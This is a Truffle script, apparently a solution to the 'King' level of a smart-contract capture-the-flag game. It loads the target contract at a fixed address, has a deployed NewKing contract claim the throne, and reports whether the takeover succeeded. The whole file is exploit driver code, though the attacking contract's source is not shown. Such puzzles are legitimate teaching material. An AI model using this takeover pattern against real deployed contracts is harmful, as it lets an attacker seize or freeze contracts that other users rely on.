const King = artifacts.require("King");
const NewKing = artifacts.require("NewKing");

module.exports = async (callback) => {
  const web3 = King.web3;
  try {
    const kingAddress = "0x8f7F792e210CBEcEe783395ac9B0845C85845C4A";
    const king = await King.at(kingAddress);
    const newKing = await NewKing.deployed();
    const currentKing1 = await king._king();
    console.log("Current king:", currentKing1);
    // let prize = await king.prize();
    // console.log("Current Prize:", Number(prize));
    console.log("Claiming throne...");
    await newKing.claimThrone();

    const currentKing2 = await king._king();
    // console.log("Current king:", currentKing2);
    console.log(
      `${
        currentKing1 == currentKing2
          ? "Unsuccesful takeover."
          : "Success! You are the new king!"
      }`
    );
  } catch (err) {
    console.log("Oops: ", err.message);
  }

  callback();
};
